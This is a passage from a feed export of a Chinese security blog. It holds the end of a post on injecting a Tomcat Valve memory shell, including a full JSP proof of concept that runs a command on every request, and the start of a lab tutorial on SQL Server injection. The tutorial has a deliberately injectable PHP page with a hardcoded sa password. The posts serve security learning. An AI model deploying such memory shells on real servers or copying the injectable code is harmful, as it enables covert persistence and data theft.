<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 更简单的方法 获取StandardContext  </span></span><br><span class="line"> <span class="title class_">Field</span> reqF = request.<span class="title function_">getClass</span>().<span class="title function_">getDeclaredField</span>(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line"> reqF.<span class="title function_">setAccessible</span>(<span class="literal">true</span>);  </span><br><span class="line"> <span class="title class_">Request</span> req = (<span class="title class_">Request</span>) reqF.<span class="title function_">get</span>(request);  </span><br><span class="line"> <span class="title class_">StandardContext</span> standardContext = (<span class="title class_">StandardContext</span>) req.<span class="title function_">getContext</span>();  </span><br></pre></td></tr></table></figure>

<p>最后实现内存马的注入</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">  standardContext.<span class="title function_">getPipeline</span>().<span class="title function_">addValve</span>(<span class="keyword">new</span> <span class="title function_">shellValve</span>());</span><br><span class="line">  out.<span class="title function_">println</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>最终poc如下</strong></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;&lt;%--</span><br><span class="line">  <span class="title class_">Created</span> by <span class="title class_">IntelliJ</span> <span class="variable constant_">IDEA</span>.</span><br><span class="line">  <span class="title class_">User</span>: <span class="title class_">Andu1</span>n</span><br><span class="line">  <span class="title class_">Date</span>: <span class="number">2025</span>/<span class="number">2</span>/<span class="number">21</span></span><br><span class="line">  <span class="title class_">Time</span>: <span class="number">11</span>:<span class="number">15</span></span><br><span class="line">  <span class="title class_">To</span> change <span class="variable language_">this</span> template use <span class="title class_">File</span> | <span class="title class_">Settings</span> | <span class="title class_">File</span> <span class="title class_">Templates</span>.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  ServletContext servletContext = request.getSession().getServletContext();</span></span><br><span class="line"><span class="language-xml">  Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  appctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">  Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="language-xml">  stdctx.setAccessible(true);</span></span><br><span class="line"><span class="language-xml">  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&lt;%!</span></span><br><span class="line"><span class="language-xml">  public class shellValve extends ValveBase &#123;</span></span><br><span class="line"><span class="language-xml">    @Override</span></span><br><span class="line"><span class="language-xml">    public void invoke(Request request, Response response) throws IOException, ServletException &#123;</span></span><br><span class="line"><span class="language-xml">      Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">  &#125;</span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&lt;%</span></span><br><span class="line"><span class="language-xml">  standardContext.getPipeline().addValve(new shellValve());</span></span><br><span class="line"><span class="language-xml">  out.println(&quot;success&quot;);</span></span><br><span class="line"><span class="language-xml">%&gt;</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>启动tomcat服务后，访问我们上传的<code>addValve.jsp</code>后，Vlave内存马就被成功注入，后续访问任意路径，都会触发我们的Valve内存马</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740108765334-e82c69bb-b0be-466e-8eb7-a2f1fc84acae.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>memShell</tag>
      </tags>
  </entry>
  <entry>
    <title>基于SqlServer的SQL注入</title>
    <url>/2025/07/09/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="Ie5J5">基于SqlServer的SQL注入</h1>
<h2 id="YBV7G">前言</h2>

<p>最近面试了几家实习，都问了基于SqlServer的SQL注入，所以今天想补一下基础。</p>
<h2 id="o2JTT">SqlServer搭建</h2>

<p>搭建SqlServer，我们的环境和版本如下：</p>
<ul>
<li>Windows Server 2012</li>
<li>SqlServer 2012</li>
</ul>
<p>这里的SqlServer环境搭建比较简单，可以参考该链接进行安装 <a href="https://blog.csdn.net/gengkui9897/article/details/89301494">https://blog.csdn.net/gengkui9897/article/details/89301494</a></p>
<h2 id="vucaF">SqlServer基础</h2>

<p>Microsoft SQL Server（微软结构化查询语言服务器）也叫Mssql，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。属关系型数据库。默认端口号为1433。</p>
<h3 id="ZNxWD">默认数据库</h3>

<p>安装好SqlServer后，SqlServer数据库中会有6个默认的库，用于维护系统正常运行的<strong>系统数据库</strong>，其中包括四个系统数据库：<code>master 、model 、msdb 、tempdb</code> ，和两个实例数据库：<code>ReportServer、ReportServerTempDB</code></p>
<h4 id="kL0Os">系统数据库：</h4>

<ul>
<li>**master：**记录了SqlServer实例的所有系统级消息，包括实例范围的元数据（如登录账号、端点、链接服务器和系统配置设置）</li>
<li>msdb：供SqlServer代理服务调度报警和作业记录操作员的使用，保存关于调度报警、作业、操作员等信息</li>
<li>model：SqlServer实例上创建的所有数据库的模板</li>
<li>tempdb：临时数据库，用于保存临时对象或中间结果集，为数据库的排列等操作提供一个临时的工作空间</li>
</ul>
<h4 id="qWTUS">实例数据库：</h4>

<ul>
<li>ReportServer：存储SSRS配置部分，报告定义，报告元数据，报告历史，缓存政策，快照，资源，安全设置，加密的数据，调度和提交数据，以及扩展信息</li>
<li>ReportServerTempDB：存储中间处理产品，例如缓冲的报告、会话和执行数据等</li>
</ul>
<h3 id="VGws7">数据库的组成</h3>

<p>在SqlServer中，数据库是以文件的形式存在的，由文件和文件组组成</p>
<h4 id="cgnEs">文件</h4>

<p>数据库中的文件基本是分为以下三类：</p>
<ul>
<li>主要数据文件：存放数据和数据库的初始化信息。每个数据库有且只能有一个主要数据文件<code>.mdf</code>结尾</li>
<li>次要数据文件：存放除了主要数据文件以外的所有数据文件。次要数据文件不是必须的，可以没有，也可以有多个<code>.ndf</code>结尾</li>
<li>事务日志文件：存放用户回复数据库的所有文件信息。每个数据库至少有一个日志文件，也可以有多个<code>.ldf</code>结尾</li>
</ul>
<h4 id="Eo4Ms">文件组</h4>

<p>文件组是数据库文件一种逻辑管理单位，他将数据库文件分成不同的文件组，方便对文件的分配和管理，分为两种类型：</p>
<ul>
<li>主文件组Primary：主要是数据文件和没有明确指派给其他文件组的文件</li>
<li>用户自定义的文件组：Create DataBase 或者 Alter DataBase语句，FileGroup关键字指定的文件组</li>
</ul>
<h4 id="x8Cvj">设计原则</h4>

<p>SqlServer数据库的设计原则如下</p>
<ul>
<li>文件只能是一个文件组的成员</li>
<li>文件或文件组不能由多个数据库使用</li>
<li>日志不能作为文件组的一部分</li>
</ul>
<h3 id="Cm4QN">SqlServer权限</h3>

<p>sqlserver中的权限控制被分成服务器和数据库两个级别，一个服务器可以包含多个数据库。服务器级别权限可以让我们控制登录、服务器资源操作等等；数据库级别的权限可以让我们对具体的表\视图\数据等数据库内资源进行操作。</p>
<p>在SQL注入的漏洞挖掘中，我们关注的是sqlserver服务器级别的权限，可以把权限简单的归为以下三类：</p>
<ul>
<li>**sa权限：**即服务器角色sysadmin。拥有数据库操作，文件管理，命令执行，注册表读取等权限。SQLServer数据库的最高权限 </li>
<li>**db权限：**文件管理，数据库操作等权限 users-administrators </li>
<li>**public权限：**数据库操作 guest-users</li>
</ul>
<p>如果我们找到一个SqlServer数据库的注入点，可以通过以下命令判断当前用户的权限，查询语句返回1，说明是对应的权限。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">--判断是否是SA权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;sysadmin&#x27;</span>)</span>     </span><br><span class="line">--判断是否是db_owner权限  </span><br><span class="line">select <span class="title function_">is_member</span><span class="params">(<span class="string">&#x27;db_owner&#x27;</span>)</span></span><br><span class="line">--判断是否是<span class="keyword">public</span>权限</span><br><span class="line">select <span class="title function_">is_srvrolemember</span><span class="params">(<span class="string">&#x27;public&#x27;</span>)</span></span><br></pre></td></tr></table></figure>

<h2 id="ybo2c">T-SQL语言</h2>

<p>在mysql数据库中使用sql语句对数据库进行操作，而在sqlserver数据库中使用的是Transaction-SQL语言，简称T-SQL。T-SQL是在SQL基础之上的一种数据库编程语言。</p>
<p>在这篇文章中，我们基于增删改查和创建数据库去简单了解T-SQL语言</p>
<h3 id="dfWqj">创建数据库</h3>

<p>用T-SQL去创建名为SQLDB的数据库，语句如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE SQLDB;</span><br></pre></td></tr></table></figure>

<p>如果希望对数据库的文件路径、大小、增长方式等进行配置，可以使用以下命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE SQLDB</span><br><span class="line">ON <span class="title function_">PRIMARY</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_data,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_data.mdf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 10MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 100MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">LOG <span class="title function_">ON</span> <span class="params">(</span></span><br><span class="line"><span class="params">    NAME = SQLDB_log,</span></span><br><span class="line"><span class="params">    FILENAME = <span class="string">&#x27;C:\MSSQL\DATA\SQLDB_log.ldf&#x27;</span>,</span></span><br><span class="line"><span class="params">    SIZE = 5MB,</span></span><br><span class="line"><span class="params">    MAXSIZE = 50MB,</span></span><br><span class="line"><span class="params">    FILEGROWTH = 5MB</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749273823298-089e8d08-ccaa-49dc-82f8-17a60af1f3bc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="waUGu">创建表</h3>

<p>用T-SQL在SQLDB中新建表，新建表的时候要同时指明字段信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 创建一个名为 Employees 的表</span><br><span class="line">CREATE TABLE <span class="title function_">Employees</span> <span class="params">(</span></span><br><span class="line"><span class="params">    EmployeeID INT PRIMARY KEY IDENTITY(<span class="number">1</span>,<span class="number">1</span>)</span>,  -- 员工ID，主键，自增</span><br><span class="line">    FirstName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,           -- 名，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    LastName <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL,            -- 姓，最大<span class="number">50</span>字符，不能为空</span><br><span class="line">    BirthDate DATE NULL,                       -- 出生日期，可以为空</span><br><span class="line">    HireDate DATE NOT NULL,                    -- 入职日期，不能为空</span><br><span class="line">    Email <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">100</span>)</span> UNIQUE,                -- 邮箱，唯一约束，可为空</span><br><span class="line">    Salary <span class="title function_">DECIMAL</span><span class="params">(<span class="number">10</span>, <span class="number">2</span>)</span> CHECK (Salary &gt;= <span class="number">0</span>)  -- 工资，保留两位小数，必须为非负数</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274154500-0fbfc9ac-df90-4df4-a735-d3905eef6611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="bGBmK">增删改查</h3>
<h4 id="Ece5h">插入数据</h4>

<p>使用Insert向该表中插入数据，可以使用以下命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 切换到 SQLDB 数据库</span><br><span class="line">USE SQLDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 向 Employees 表插入一条记录（不包括自增主键 EmployeeID）</span><br><span class="line">INSERT INTO <span class="title function_">Employees</span> <span class="params">(FirstName, LastName, BirthDate, HireDate, Email, Salary)</span></span><br><span class="line">VALUES (</span><br><span class="line">    <span class="string">&#x27;John&#x27;</span>,                -- FirstName</span><br><span class="line">    <span class="string">&#x27;Doe&#x27;</span>,                 -- LastName</span><br><span class="line">    <span class="string">&#x27;1985-06-15&#x27;</span>,          -- BirthDate</span><br><span class="line">    <span class="string">&#x27;2020-01-10&#x27;</span>,          -- HireDate</span><br><span class="line">    <span class="string">&#x27;john.doe@example.com&#x27;</span>,-- Email</span><br><span class="line">    <span class="number">5500.00</span>                -- Salary</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274430512-4d8c38c1-16bd-419b-9239-7e71cb1cf558.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="TGGaN">删除数据</h4>

<p>使用DELETE删除名为John Doe的员工，命令如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 删除名为 John Doe 的员工</span><br><span class="line">DELETE FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;John&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274538213-7a61e8f0-f9b1-42fa-980e-0d0034267d3e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="Xbebe">修改数据</h4>

<p>修改名为Sean Doe的员工的薪资，修改为<code>6000.00</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 修改名为 Sean Doe 的员工薪资为 <span class="number">6000.00</span></span><br><span class="line">UPDATE Employees</span><br><span class="line"><span class="type">SET</span> <span class="variable">Salary</span> <span class="operator">=</span> <span class="number">6000.00</span></span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274637417-9a73bfad-551d-49c6-a02a-9ea4a55cfd8d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="egPq9">查询数据</h4>

<p>查询数据的所使用的语句基本结构如下</p>
<p>后续进行SQL注入时，使用查询语句的频率最高</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SELECT &lt;列名<span class="number">1</span>&gt;, &lt;列名<span class="number">2</span>&gt;, ...</span><br><span class="line">FROM &lt;表名&gt;</span><br><span class="line">[WHERE &lt;筛选条件&gt;]</span><br><span class="line">[GROUP BY &lt;分组列&gt;]</span><br><span class="line">[HAVING &lt;分组后的筛选条件&gt;]</span><br><span class="line">[ORDER BY &lt;排序列&gt; [ASC|DESC]];</span><br></pre></td></tr></table></figure>

<p>这里我们举个例子，可以使用以下 T-SQL 语句来查询名为 Sean Doe 的员工的邮箱和薪资信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SELECT Email, Salary</span><br><span class="line">FROM Employees</span><br><span class="line"><span class="type">WHERE</span> <span class="variable">FirstName</span> <span class="operator">=</span> <span class="string">&#x27;Sean&#x27;</span> <span class="type">AND</span> <span class="variable">LastName</span> <span class="operator">=</span> <span class="string">&#x27;Doe&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749274859375-1b2cfc38-dada-475c-9c7a-56c66ee3b16c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="X0Ppb">SqlServer手工注入</h2>

<p>MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库的功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路。</p>
<p>对于MSSQL注入点，我们往往最关心的是这个注入点的权限问题，上面讲过，对于MSSQL有以下三个权限：</p>
<ol>
<li>sa（最高权限 System）</li>
<li>db（文件管理、数据库操作等等 user-administrator）</li>
<li>public（数据库操作权限 guest-users）</li>
</ol>
<p>常见搭配为：asp&#x2F;aspx + sqlserver</p>
<h3 id="qdFxg">环境搭建</h3>
实验环境：

<ul>
<li>SqlServer 2012</li>
<li>phpstudy 2018</li>
<li>php7.3.4</li>
</ul>
<p>首先在数据库中创建数据库，创建数据表和插入输入等操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">-- 第一步：创建数据库</span><br><span class="line">USE master;</span><br><span class="line">GO</span><br><span class="line">CREATE DATABASE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第二步：切换到该数据库</span><br><span class="line">USE SchoolDB;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">-- 第三步：创建学生表</span><br><span class="line">CREATE TABLE <span class="title function_">Students</span> <span class="params">(</span></span><br><span class="line"><span class="params">    StudentID INT PRIMARY KEY NOT NULL,         -- 学号，主键</span></span><br><span class="line"><span class="params">    StudentName NVARCHAR(<span class="number">50</span>)</span> NOT NULL,          -- 姓名</span><br><span class="line">    Age INT NOT NULL,                           -- 年龄</span><br><span class="line">    Class <span class="title function_">NVARCHAR</span><span class="params">(<span class="number">50</span>)</span> NOT NULL                 -- 所在班级</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">-- 第四步：插入示例学生数据</span><br><span class="line">INSERT INTO <span class="title function_">Students</span> <span class="params">(StudentID, StudentName, Age, Class)</span></span><br><span class="line">VALUES</span><br><span class="line">    (<span class="number">101</span>, <span class="string">&#x27;张三&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>),</span><br><span class="line">    (<span class="number">102</span>, <span class="string">&#x27;李四&#x27;</span>, <span class="number">17</span>, <span class="string">&#x27;高一2班&#x27;</span>),</span><br><span class="line">    (<span class="number">103</span>, <span class="string">&#x27;王五&#x27;</span>, <span class="number">16</span>, <span class="string">&#x27;高一1班&#x27;</span>);</span><br><span class="line">GO</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要在phpstudy中添加sqlsrv扩展，下载链接<a href="https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases">https://learn.microsoft.com/en-us/sql/connect/php/release-notes-php-sql-driver?view=sql-server-ver15#previous-releases</a></p>
<p>因为我这里是php7.3.4版本，我们需要将这两个文件放到<code>C:\phpstudy_pro\Extensions\php\php7.3.4nts\ext</code>目录下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749278764229-24daed4b-4130-40f2-ba42-c3e5aa3a7181.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>并在php.ini文件中添加这两行配置</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">extension=php_sqlsrv_63_nts.dll</span><br><span class="line">extension=php_pdo_sqlsrv_73_nts.dll</span><br></pre></td></tr></table></figure>

<p>进入phpinfo界面后，可以看到我们的sqlsrv扩展就已经配置好了</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279018263-2dfcd35e-23eb-4c24-8a63-ec895ad57e94.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>除此之外，还需要去安装ODBC Driver，链接如下（64位电脑安装64位驱动即可）</p>
<p><a href="https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip">https://files.cnblogs.com/files/wtcl/sqlserverodbc.zip</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279529839-7ee6566a-38e7-4727-87db-72943da5821a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在网站目录下，创建一个进行sql查询的php文件，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">header</span><span class="params">(<span class="string">&quot;Content-Type:text/html;charset=gbk&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据库连接</span></span><br><span class="line">$conn = sqlsrv_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, array(</span><br><span class="line">    <span class="string">&#x27;Database&#x27;</span> =&gt; <span class="string">&#x27;SchoolDB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;UID&#x27;</span> =&gt; <span class="string">&#x27;sa&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PWD&#x27;</span> =&gt; <span class="string">&#x27;@sql123&#x27;</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接失败时输出错误</span></span><br><span class="line"><span class="keyword">if</span> ($conn === <span class="literal">false</span>) &#123;</span><br><span class="line">    var_dump(sqlsrv_errors());</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GET 参数 id（注意：这是一个注入测试场景）</span></span><br><span class="line">$id = $_GET[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拼接 SQL 语句</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM Students WHERE StudentID = $id&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;SQL Server injection exercise!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;sql: &quot;</span> . $sql . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line">$result = sqlsrv_query($conn, $sql);</span><br><span class="line">var_dump(sqlsrv_errors());</span><br><span class="line">echo <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果</span></span><br><span class="line"><span class="keyword">if</span> ($re = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) &#123;</span><br><span class="line">    echo <span class="string">&quot;学号：&quot;</span> . $re[<span class="string">&#x27;StudentID&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;姓名：&quot;</span> . $re[<span class="string">&#x27;StudentName&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;年龄：&quot;</span> . $re[<span class="string">&#x27;Age&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    echo <span class="string">&quot;班级：&quot;</span> . $re[<span class="string">&#x27;Class&#x27;</span>] . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;未找到该学生。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这样环境就配置好了，访问<code>http://192.168.41.131:8080/SqlServer.php?id=101</code><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749279598408-007810b0-f16a-426a-a2e3-8b8b832a4047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="lZpDf">常见注入函数和关键字</h3>

<p>以下是在SQL注入中常用的函数与关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//TOP 对标与MSSQL中的limit，想要输出一条信息 TOP 1 ，输出两条 TOP 2</span><br><span class="line">SELECT TOP 2 StudentName FROM STUDENTS</span><br><span class="line">//@@version 获取版本信息</span><br><span class="line">SELECT @@version</span><br><span class="line">//db_name 获取数据的名字</span><br><span class="line">SELECT db_name()</span><br><span class="line">//OBEJCT_ID 获取表对象ID</span><br><span class="line">OBJECT_ID(&#x27;表名&#x27;)</span><br><span class="line">//col_name table_id表对象ID column_id 列的序号 </span><br><span class="line">COL_NAME ( table_id , column_id )</span><br><span class="line">//convert 把日期转换成新数据类型的通用函数</span><br><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">//stuff 删除字符串中的一部分内容，用另一个字符串替代</span><br><span class="line">stuff( character_expression , start , length , replaceWith_expression )</span><br><span class="line">//len 返回目标字符串的长度</span><br><span class="line">len(select db_name())</span><br><span class="line">//SUBSTRING 用于从字符串中提取指定位置的一部分</span><br><span class="line">SUBSTRING(expression, start, length)</span><br></pre></td></tr></table></figure>

<h3 id="HZao5">注入手法</h3>

<p>注入手法总的来说和Mysql差不多，差别在于一些函数的区别</p>
<h4 id="JU1ft">联合查询</h4>

